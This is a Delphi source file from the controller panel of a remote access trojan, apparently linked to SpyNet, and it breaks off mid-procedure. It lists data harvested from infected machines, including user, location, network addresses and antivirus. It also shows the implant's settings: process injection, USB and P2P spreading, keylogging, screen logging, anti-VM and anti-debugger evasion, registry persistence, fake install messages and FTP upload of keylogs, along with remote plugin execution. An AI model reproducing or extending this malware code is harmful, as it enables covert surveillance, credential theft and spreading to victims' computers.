unit UnitInformations;  //Map viewer from Rodrigo Ruz(theroadtodelphi.com)

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, acPNG, ExtCtrls, acImage, jpeg, UnitMain,
  SocketUnitEx, UnitFunctions, StdCtrls, UnitCommands, OleCtrls, SHDocVw,
  UnitCountry, ActiveX, Menus, UnitRepository, AdvMemo, ImgList, UnitVariables,
  TeeProcs, TeEngine, Chart, Spin, Series, TeeFunci, UnitEncryption, MSHTML,
  UnitManager, BTMemoryModule, UnitConstants;

type
  TFormInformations = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    pnlMap: TPanel;
    pnlClient: TPanel;
    pnlSystem: TPanel;
    btn5: TToolButton;
    lvSystem: TListView;
    wb1: TWebBrowser;
    pm1: TPopupMenu;
    advm1: TAdvMemo;
    btn3: TToolButton;
    pnlPlugin: TPanel;
    lvPlugin: TListView;
    il1: TImageList;
    pb1: TProgressBar;
    btn4: TToolButton;
    pm3: TPopupMenu;
    E1: TMenuItem;
    btn7: TToolButton;
    ilDevices: TImageList;
    pnlDevices: TPanel;
    spl1: TSplitter;
    lvDevices: TListView;
    tvDevices: TTreeView;
    pnl1: TPanel;
    cbb1: TComboBoxEx;
    lbl2: TLabel;
    cbb2: TComboBoxEx;
    lbl4: TLabel;
    btn8: TButton;
    pm6: TPopupMenu;
    R7: TMenuItem;
    C1: TMenuItem;
    U1: TMenuItem;
    dlgOpen1: TOpenDialog;
    R1: TMenuItem;
    I1: TMenuItem;
    N2: TMenuItem;
    il2: TImageList;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure E1Click(Sender: TObject);
    procedure R7Click(Sender: TObject);
    procedure tvDevicesChange(Sender: TObject; Node: TTreeNode);
    procedure FormCreate(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure cbb1Change(Sender: TObject);
    procedure btn8Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure lvPluginContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R1Click(Sender: TObject);
    procedure I1Click(Sender: TObject);
    procedure lvDevicesColumnClick(Sender: TObject; Column: TListColumn);
  private
    { Private declarations }
    Client: TClientDatas;        
    DevicesCount: Integer;
    procedure ListDevices(List: string);
    procedure ListDevicesExtras(List: string);
    procedure InitImageList;
    procedure ReleaseImageList;
    function GetDeviceImageIndex(DeviceGUID: TGUID): Integer;
    function RetrieveLogs: string;
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _Client: TClientDatas);   
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormInformations: TFormInformations;

implementation

uses
  ListarDispositivos, SetupApi;

{$R *.dfm}
           
var
  LastColumn: TListColumn;
  Ascending: Boolean;
  
const  //Maps constants
  GoogleMapsPage: AnsiString =
    '<html> '+
    '<head> '+
    '<meta name="viewport" content="initial-scale=1.0, user-scalable=yes" /> '+
    '<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script> '+
    '<script type="text/javascript"> '+
    '  var map;'+
    '  function initialize() { '+
    '    geocoder = new google.maps.Geocoder();'+
    '    var latlng = new google.maps.LatLng([Lat],[Lng]); '+
    '    var myOptions = { '+
    '      zoom: 12, '+
    '      center: latlng, '+
    '      mapTypeId: google.maps.MapTypeId.[Type] '+
    '    }; '+
    '    map = new google.maps.Map(document.getElementById("map_canvas"), myOptions); '+
    '    var marker = new google.maps.Marker({'+
    '      position: latlng, '+
    '      title: "[Title]", '+
    '      map: map '+
    '  });'+
    '  } '+
    ''+'</script> '+
    '</head> '+
    '<body onload="initialize()"> '+
    '  <div id="map_canvas" style="width:100%; height:100%"></div> '+
    '</body>'+
    '</html>';

  YahooMapsPage: AnsiString =
    '<html> '+
    '<head> '+
    '<meta name="viewport" content="initial-scale=1.0, user-scalable=yes" /> '+
    '<script type="text/javascript" src="http://api.maps.yahoo.com/ajaxymap?v=3.8&amp;appid=08gJIU7V34H9WlTSGrIyEIb73GLT5TpAaF2HzOSJIuTO2AVn6qzftRPDQtcQyynObIG8"></script> '+
    '<script type="text/javascript"> '+
    '  function initialize() '+
    '{'+
    '  var map = new YMap ( document.getElementById ( "map_canvas" ) );'+
    '  map.addTypeControl();'+
    '  map.addZoomLong(); '+
    '  map.addPanControl();'+
    '	 map.setMapType ( YAHOO_MAP_[Type] );'+
    '	 var geopoint = new YGeoPoint ( [Lat] , [Lng] ); '+
    '	 map.drawZoomAndCenter ( geopoint , 5 );'+
    '  var newMarker= new YMarker(geopoint); '+
    '  var markerMarkup = "[Title]";'+
    '	 newMarker.openSmartWindow(markerMarkup);'+
    '	 map.addOverlay(newMarker);'+
    '}'+
    ''+'</script> '+
    '</head> '+
    '<body onload="initialize()"> '+
    '  <div id="map_canvas" style="width:100%; height:100%"></div> '+
    '</body>'+
    '</html>';

  BingsMapsPage: AnsiString =
    '<html> '+
    '<head> '+
    '<meta name="viewport" content="initial-scale=1.0, user-scalable=yes" /> '+
    '<script type="text/javascript" src="http://dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=6.2"></script> '+
    '<script type="text/javascript"> '+
    'var map = null; '+
    '  function initialize() '+
    '{'+
    '        map = new VEMap("map_canvas"); '+
    '        map.LoadMap(new VELatLong([Lat],[Lng]), 10 ,"h" ,false);'+
    '        map.SetMapStyle(VEMapStyle.[Type]);'+
    '        map.ShowMiniMap((document.getElementById("map_canvas").offsetWidth - 180), 200, VEMiniMapSize.Small);'+
    '        map.SetZoomLevel (12);'+
    '	       shape = new VEShape(VEShapeType.Pushpin, map.GetCenter()); '+
    '	       shape.SetTitle("[Title]");'+
    '	       map.AddShape ( shape );'+
    '}'+
    ''+'</script> '+
    '</head> '+
    '<body onload="initialize()"> '+
    '  <div id="map_canvas" style="width:100%; height:100%"></div> '+
    '</body>'+
    '</html>';

  OpenStreetMapsPage: string =
    '<html> ' +
    '<head> ' +
    '<meta name="viewport" content="initial-scale=1.0, user-scalable=yes" /> ' +
    '<script src="http://www.openlayers.org/api/OpenLayers.js"></script> ' +
    '<script type="text/javascript"> '+
    'function initialize() '+
    '{' +
    '    map = new OpenLayers.Map("map_canvas");' +
    '    map.addLayer(new OpenLayers.Layer.OSM()); ' +
    '    var lonLat = new OpenLayers.LonLat( [Lng] , [Lat] ) ' +
    '          .transform( '+
    '            new OpenLayers.Projection("EPSG:4326"), ' +
    '            map.getProjectionObject() '+
    '          ); ' +
    '    var zoom=16; ' +
    '    var markers = new OpenLayers.Layer.Markers( "Markers" );  ' +
    '    map.addLayer(markers); ' +
    '    markers.addMarker(new OpenLayers.Marker(lonLat)); ' +
    '    map.setCenter (lonLat, zoom); ' +
    '}' +
    '' + '</script> ' +
    '</head> ' +
    '<body onload="initialize()"> ' +
    '  <div id="map_canvas" style="width:100%; height:100%"></div> ' +
    '</body>' +
    '</html>';

  GoogleMapsTypes : Array[0..3] of string = ('HYBRID', 'ROADMAP', 'SATELLITE', 'TERRAIN');
  BingMapsTypes : Array[0..4] of string = ('Hybrid', 'Road', 'Aerial', 'Oblique', 'Birdseye');
  YahooMapsTypes : Array[0..2] of string = ('HYB', 'SAT', 'REG');

constructor TFormInformations.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormInformations.btn1Click(Sender: TObject);
var
  Infos, Tmpstr, TmpStr1: string;
  TmpList: TStringArray;
  TmpItem: TListItem;
begin
  pnlSystem.BringToFront;
  if lvSystem.Items.Count > 0 then Exit;

  lvSystem.Clear;
  if Client.ClientSocket.Connected = False then Exit;

  lvSystem.Items.BeginUpdate;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Identification';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 0;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Username';
  TmpItem.SubItems.Add(Client.Infos.User);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Computer name';
  TmpItem.SubItems.Add(Client.Infos.Computer);    
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Account type';
  TmpItem.SubItems.Add(Client.Infos.UserType);  
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;  
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Location'; 
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Country';

  if GeoIpLocalisation = True then
    TmpItem.SubItems.Add(GeoIpCountryName(Client.WanIp))
  else TmpItem.SubItems.Add(GetCountryName(Client.Infos.CountryCode));    
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Language';
  TmpItem.SubItems.Add(Client.Infos.Language);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Region';
  TmpItem.SubItems.Add(GeoIpRegionName(Client.WanIp));  
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'City';
  TmpItem.SubItems.Add(GeoIpCityName(Client.WanIp));  
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Zip code';
  TmpItem.SubItems.Add(GeoIpZipCode(Client.WanIp));
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Network';  
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 2;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'LAN address';
  TmpItem.SubItems.Add(Client.Infos.LanIp);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'WAN address';
  TmpItem.SubItems.Add(Client.WanIp);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Mac address';
  if Client.Infos.MAC = '' then TmpItem.SubItems.Add('-') else
  TmpItem.SubItems.Add(Client.Infos.MAC);
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'System';   
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 4;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Architecture';
  TmpItem.SubItems.Add(Client.Infos.ArchType);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Windows version';
  TmpItem.SubItems.Add(Client.Infos.Windows);   
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Root drive';
  TmpItem.SubItems.Add(Client.Infos.RootDrive); 
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'System directory';
  TmpItem.SubItems.Add(Client.Infos.SystemDir); 
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'CPU';
  TmpItem.SubItems.Add(Client.Infos.CPU);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'GPU';
  TmpItem.SubItems.Add(Client.Infos.GPU);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Total memory';
  TmpItem.SubItems.Add(Client.Infos.RAM); 
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Idle';
  TmpItem.SubItems.Add(Client.Infos.Idle);  
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Uptime';
  TmpItem.SubItems.Add(Client.Infos.Uptime); 
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Screen resolution';
  TmpItem.SubItems.Add(Client.Infos.ScreenRes);  
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Default browser path';
  TmpItem.SubItems.Add(Client.Infos.Browser);  
  TmpItem.ImageIndex := -1;
           
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Drives';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 6;

  Tmpstr := Client.Infos.DrivesInfos;
  while TmpStr <> '' do
  begin
    Application.ProcessMessages;

    TmpStr1 := Copy(Tmpstr, 1, Pos(#13#10, Tmpstr) - 1);
    Delete(Tmpstr, 1, Pos(#13#10, Tmpstr) + 1);
    TmpList := ParseString('|', TmpStr1);

    TmpItem := lvSystem.Items.Add;
    TmpItem.Caption := TmpList[0] + ' [' + TmpList[2] + ']';
    TmpItem.SubItems.Add(GetDriveString(StrToInt64(TmpList[1])) + ' (Size: ' +
      FileSizeToStr(StrToInt64(TmpList[4])) + ')');
    TmpItem.ImageIndex := -1;
  end;
              
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;
                     
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Security'; 
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 3;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Antivirus';
  TmpItem.SubItems.Add(Client.Infos.Antivirus);   
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Firewall';
  TmpItem.SubItems.Add(Client.Infos.Firewall); 
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := '';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := -1;

  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'BIOS';
  TmpItem.SubItems.Add('');
  TmpItem.ImageIndex := 5;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Vendor';
  TmpItem.SubItems.Add(Client.Infos.BIOS);
  TmpItem.ImageIndex := -1;
  TmpItem := lvSystem.Items.Add;
  TmpItem.Caption := 'Version';
  TmpItem.SubItems.Add(Client.Infos.BIOSVer);
  TmpItem.ImageIndex := -1;
  
  lvSystem.Items.EndUpdate;
  AddLog('Computer informations items listed');
  
  Infos := RetrieveLogs;
  Infos := EnDecryptText(Infos, PROGRAMPASSWORD);
  TmpStr := GetUserFolder(Client.UserId) + '\Computer informations.data';
  if FileExists(Tmpstr) then DeleteFile(Tmpstr);
  MyCreateFile(TmpStr, Infos, Length(Infos));
end;

procedure TFormInformations.btn2Click(Sender: TObject);
var
  i: Integer;       
  TmpList, TmpList1: TStringArray;
  Config, Infos, TmpStr: string;
  _Hosts: array [0..4] of string;
  _Ports: array [0..4] of Word;
  _FTPOptions, _MessageParams: array[0..3] of string;
  _KeylogSize: Integer;
  _Delay, _FTPPort, _FTPDelay: Word;
  _ClientId, _StartupKey, _Password, _MutexName, _ClientConfig,
  _ActiveX, _SpreadAs, _Foldername, _FileName, _Destination,
  _InjectInto, _GroupId, _P2PNames, _Windows: string;
  _FakeMessage, _Install, _Keylogger, _Melt, _Startup, _USB, _P2P,
  _Hide, _WaitReboot, _ChangeDate, _HKCUStartup, _HKLMStartup,
  _PoliciesStartup, _Persistence, _FTPLogs, _Binded, _AntiVM,
  _AntiSB, _AntiDG, _AntiPA, _RunOnceStartup, _Screenlogger,
  _AntiRemove: Boolean;
begin
  pnlClient.BringToFront;
  if advm1.Lines.Strings[0] <> '' then Exit;

  advm1.Lines.Clear;
  if Client.ClientSocket.Connected = False then Exit;

  Config := Client.Infos.Config;
  TmpList := ParseString('|', Config);

  TmpList1 := ParseString('#', TmpList[0]);
  for i := 0 to High(_Hosts) do _Hosts[i] := TmpList1[i];

  TmpList1 := ParseString('#', TmpList[1]);
  for i := 0 to High(_Ports) do _Ports[i] := StrToInt(TmpList1[i]);

  TmpList1 := ParseString('#', TmpList[2]);
  for i := 0 to High(_FTPOptions) do _FTPOptions[i] := TmpList1[i];

  TmpList1 := ParseString('#', TmpList[3]);
  for i := 0 to High(_MessageParams) do _MessageParams[i] := TmpList1[i];

  _Delay := StrToInt(TmpList[4]);
  _FTPPort := StrToInt(TmpList[5]);
  _FTPDelay := StrToInt(TmpList[6]);
  _KeylogSize	:= StrToInt(TmpList[7]);

  _GroupId := TmpList[8];
  _ClientId := TmpList[9];
  _StartupKey := TmpList[10];
  _Password := TmpList[11];
  _MutexName := TmpList[12];
  _Foldername := TmpList[13];
  _FileName := TmpList[14];
  _Destination := TmpList[15];
  _InjectInto := TmpList[16];
  _ActiveX := TmpList[17];
  _SpreadAs := TmpList[18];
  _P2PNames := TmpList[19];
  _Windows := TmpList[20];

  _FakeMessage := MyStrToBool(TmpList[21]);
  _Install := MyStrToBool(TmpList[22]);
  _Keylogger := MyStrToBool(TmpList[23]);
  _Melt := MyStrToBool(TmpList[24]);
  _Startup := MyStrToBool(TmpList[25]);
  _Hide := MyStrToBool(TmpList[26]);
  _WaitReboot := MyStrToBool(TmpList[27]);
  _ChangeDate := MyStrToBool(TmpList[28]);
  _HKCUStartup := MyStrToBool(TmpList[29]);
  _HKLMStartup := MyStrToBool(TmpList[30]);
  _PoliciesStartup := MyStrToBool(TmpList[31]);
  _RunOnceStartup := MyStrToBool(TmpList[32]);
  _Persistence := MyStrToBool(TmpList[33]);
  _FTPLogs := MyStrToBool(TmpList[34]);
  _USB := MyStrToBool(TmpList[35]);
  _P2P := MyStrToBool(TmpList[36]);
  _AntiVM := MyStrToBool(TmpList[37]);
  _AntiSB := MyStrToBool(TmpList[38]);
  _AntiDG := MyStrToBool(TmpList[39]);
  _AntiPA := MyStrToBool(TmpList[40]);
  _Screenlogger := MyStrToBool(TmpList[41]);
  _AntiRemove := MyStrToBool(TmpList[42]);

  advm1.Lines.Add(JustL('General settings', 0));                   
  advm1.Lines.Add(JustL('  Group id', 40) + Copy(_GroupId, 1, Pos(':', _GroupId) - 1));
  advm1.Lines.Add(JustL('  Identification', 40) + Copy(_ClientId, 1, Pos(':', _ClientId) - 1));
  advm1.Lines.Add(JustL('  Password', 40) + _Password);
  advm1.Lines.Add(JustL('  Process injection', 40) + _InjectInto);
  advm1.Lines.Add(JustL('  Process mutex', 40) + _MutexName);
  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Network', 0));

  for i := 0 to 4 do
  if (_Hosts[i] <> '') and (_Ports[i] <> 0) then
  advm1.Lines.Add(JustL('  Host[' + IntToStr(i) + ']', 40) + _Hosts[i] + ':' + IntToStr(_Ports[i]));

  advm1.Lines.Add(JustL('  Reconnection delay', 40) + IntToStr(_Delay) + ' second(s)');
  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Installation', 0));
  advm1.Lines.Add(JustL('  Install client', 40) + MyBoolToStr(_Install));

  if _Install then
  begin
    advm1.Lines.Add(JustL('  File path', 40) + Client.Infos.InstalledName);
    advm1.Lines.Add(JustL('  Installation date', 40) + Client.Infos.InstalledDate);
    advm1.Lines.Add(JustL('  Melt file after installation', 40) + MyBoolToStr(_Melt));
    advm1.Lines.Add(JustL('  Change folder and filename time', 40) + MyBoolToStr(_ChangeDate));
    advm1.Lines.Add(JustL('  Hide folder and filename', 40) + MyBoolToStr(_Hide));
    advm1.Lines.Add(JustL('  Enable keylogger', 40) + MyBoolToStr(_Keylogger));  
    advm1.Lines.Add(JustL('  Enable screenlogger', 40) + MyBoolToStr(_Screenlogger));
    advm1.Lines.Add(JustL('  Wait for system reboot', 40) + MyBoolToStr(_WaitReboot));
    advm1.Lines.Add(JustL('  Persistence installation', 40) + MyBoolToStr(_Persistence));
  end;

  if _Install then
  begin    
    advm1.Lines.Add('');
    advm1.Lines.Add(JustL('Spreading', 0));
    advm1.Lines.Add(JustL('  USB spreading', 40) + MyBoolToStr(_USB));
    if _USB then advm1.Lines.Add(JustL('  Spread name', 40) + _SpreadAs);
    advm1.Lines.Add(JustL('  P2P spreading', 40) + MyBoolToStr(_P2P));
    if _P2P then advm1.Lines.Add(JustL('  P2P names', 40) + _P2PNames);
  end;
      
  if _Install then
  begin   
    advm1.Lines.Add('');
    advm1.Lines.Add(JustL('Screenlogger', 0));
    advm1.Lines.Add(JustL('  Windows titles filter', 40) + _Windows);
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Startup', 0));
  advm1.Lines.Add(JustL('  Registry startup', 40) + MyBoolToStr(_Startup));

  if _Startup then
  begin
    advm1.Lines.Add(JustL('  HKCU', 40) + MyBoolToStr(_HKCUStartup));
    advm1.Lines.Add(JustL('  HKLM', 40) + MyBoolToStr(_HKLMStartup));
    advm1.Lines.Add(JustL('  Policies', 40) + MyBoolToStr(_PoliciesStartup));
    advm1.Lines.Add(JustL('  RunOnce', 40) + MyBoolToStr(_RunOnceStartup));       
    advm1.Lines.Add(JustL('  Registry key', 40) + _StartupKey);
    if _ActiveX <> '' then advm1.Lines.Add(JustL('  ActiveX key', 40) + _ActiveX);
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Protection', 0));
  advm1.Lines.Add(JustL('  Anti Virtuals machines', 40) + MyBoolToStr(_AntiVM));
  advm1.Lines.Add(JustL('  Anti Sandboxies', 40) + MyBoolToStr(_AntiSB));
  advm1.Lines.Add(JustL('  Anti Debuggers', 40) + MyBoolToStr(_AntiDG));
  advm1.Lines.Add(JustL('  Anti Process analysers', 40) + MyBoolToStr(_AntiPA));

  if (_AntiVM) or (_AntiSB) or (_AntiDG) or (_AntiPA) then
  begin
    if _AntiRemove then
      advm1.Lines.Add(JustL('  To do', 40) + 'Self delete')
    else advm1.Lines.Add(JustL('  To do', 40) + 'Stop process');
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Keylogger', 0));
  advm1.Lines.Add(JustL('  Send keylogs by FTP', 40) + MyBoolToStr(_FTPLogs));

  if _FTPLogs then
  begin
    advm1.Lines.Add(JustL('  Host', 40) + _FTPOptions[0]);
    advm1.Lines.Add(JustL('  Port', 40) + IntToStr(_FTPPort));
    advm1.Lines.Add(JustL('  Username', 40) + _FTPOptions[1]);
    advm1.Lines.Add(JustL('  Password', 40) + _FTPOptions[2]);
    advm1.Lines.Add(JustL('  Directory', 40) + _FTPOptions[3]);
    advm1.Lines.Add(JustL('  Max logs size', 40) + IntToStr(_KeylogSize) + ' KB');
    advm1.Lines.Add(JustL('  Send logs every', 40) + IntToStr(_FTPDelay) + ' minutes');
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Fake message', 0));
  advm1.Lines.Add(JustL('  Show a fake installation message', 40) + MyBoolToStr(_FakeMessage));
  if _FakeMessage then
  begin
    advm1.Lines.Add(JustL('  Message title', 40) + _MessageParams[0]);
    advm1.Lines.Add(JustL('  Message text', 40) + _MessageParams[1]);
  end;

  AddLog(IntToStr(advm1.Lines.Count) + ' client configuration items listed');
  TmpStr := GetUserFolder(Client.UserId) + '\Client informations.data';
  Infos := advm1.Lines.Text;
  Infos := EnDecryptText(Infos, PROGRAMPASSWORD);
  MyCreateFile(TmpStr, Infos, Length(Infos));
end;

procedure TFormInformations.btn5Click(Sender: TObject);
begin
  if pnl1.Visible = True then pnl1.Visible := False else
  begin
    pnl1.Visible := True;
    pnlMap.BringToFront;
  end;
end;

procedure TFormInformations.FormShow(Sender: TObject);
begin
  btn1.Click;
end;
         
procedure TFormInformations.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormInformations.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormInformations.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormInformations.btn3Click(Sender: TObject);
begin
  pnlPlugin.BringToFront;
  if lvPlugin.Items.Count = 0 then R1Click(Sender);
end;

procedure TFormInformations.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpList: TStringArray;
  TmpItem: TListItem;
  TmpStr, TmpStr1: string;
  i: Integer;
  BufferSize: Int64;
  jpg: TJPEGImage;
  Bmp: TBitmap;
  Stream: TMemoryStream;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = CLIENTPLUGINSLIST then
    begin
      lvPlugin.Clear; 
      il1.Clear;
      
      if Datas = '' then
      begin
        AddRecvLog('Plugins not installed', clRed);
        Exit;
      end;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      lvPlugin.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Self.Refresh;
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        BufferSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
        Delete(TmpStr, 1, Pos('|', TmpStr));
        TmpStr1 := Copy(TmpStr, 1, BufferSize);
        Delete(TmpStr, 1, BufferSize);

        i := StringCount('|', TmpStr);
        TmpList := ParseString('|', TmpStr);

        TmpItem := lvPlugin.Items.Add;
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(TmpList[2]);
        TmpItem.SubItems.Add(TmpList[3]);

        if i < 7 then
        begin
          TmpItem.SubItems.Add('-');
          TmpItem.SubItems.Add(TmpList[5]);
        end
        else
        begin
          TmpItem.SubItems.Add(TmpList[5]);
          TmpItem.SubItems.Add(TmpList[6]);
        end;

        Stream := TMemoryStream.Create;
        Stream.Write(Pointer(TmpStr1)^, Length(TmpStr1));
        Stream.Position := 0;

        try
          Jpg := TJPEGImage.Create;
          Jpg.LoadFromStream(Stream);
          Stream.Free;
          Bmp := TBitmap.Create;
          Bmp.Width := Jpg.Width;
          Bmp.Height := Jpg.Height;
          Bmp.Canvas.Draw(0, 0, Jpg);
          Jpg.Free;
        except
          Stream.Free;
          Jpg.Free;
          Bmp.Free;
          Exit;
        end;

        TmpItem.ImageIndex := il1.Add(Bmp, nil);
        Bmp.Free;
      end;

      lvPlugin.Items.EndUpdate;
      AddRecvLog(IntToStr(pb1.Max) + ' plugins installed');
    end
    else

    if MainCommand = CUSTOMPLUGINUNINSTALL then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to uninstall plugin id ' + TmpStr, clRed)
      else
      begin
        lvPlugin.Items.BeginUpdate;
        for i := 0 to lvPlugin.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if lvPlugin.Items.Item[i].SubItems[4] <> TmpStr then Continue;
          lvPlugin.Items.Item[i].Delete;
          Break;
        end;

        lvPlugin.Items.EndUpdate;
        AddRecvLog('Plugi id ' + TmpStr + ' uninstalled successfully');
      end;
    end
    else

    if MainCommand = DEVICESLIST then
    begin
      DevicesCount := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
      Delete(Datas, 1, Pos('|', Datas));

      ListDevices(Datas);
      tvDevices.Enabled := True;
    end
    else

    if MainCommand = DEVICESLISTEXTRAS then
    begin
      ListDevicesExtras(Datas);
      tvDevices.Enabled := True;
    end;
  end;
end;

procedure TFormInformations.E1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lvPlugin.Selected) then Exit;

  if lvPlugin.Selected.SubItems[3] = '-' then TmpStr := lvPlugin.Selected.SubItems[4] else
    TmpStr := lvPlugin.Selected.SubItems[3];

  Client.SendDatas(CUSTOMPLUGINEXECUTE + '|' + TmpStr);
  AddSentLog('Execute plugin id ' + TmpStr);
end;

procedure TFormInformations.R7Click(Sender: TObject);
begin
  Client.SendDatas(DEVICESLIST + '|');
  AddSentLog('Get installed devices list <- this process can takes a while, please wait');
end;

procedure TFormInformations.tvDevicesChange(Sender: TObject;
  Node: TTreeNode);
var
  ANode: TTreeNode;
begin
  ANode := tvDevices.Selected;
  if Assigned(ANode) then
  if ANode.StateIndex >= 0 then
  begin
    tvDevices.Enabled := False;
    Client.SendDatas(DEVICESLISTEXTRAS + '|' + IntToStr(ANode.StateIndex));  
    AddSentLog('Get informations on device ' + tvDevices.Selected.Text);
  end;
end;

//All about devices brougth to you by SpyNet coders
procedure TFormInformations.ListDevices(List: string);
var
  dwIndex: DWORD;
  DeviceInfoData: SP_DEVINFO_DATA;
  DeviceName, DeviceClassName: string;
  tvRoot: TTreeNode;
  ClassGUID: TGUID;
  tempstr: string;
begin
  tvDevices.Items.Clear;

  pb1.Max := DevicesCount;
  pb1.Position := 0;

  tvDevices.Items.BeginUpdate;

  try
    while length(List) > 2 do // tamanho #13#10
    begin
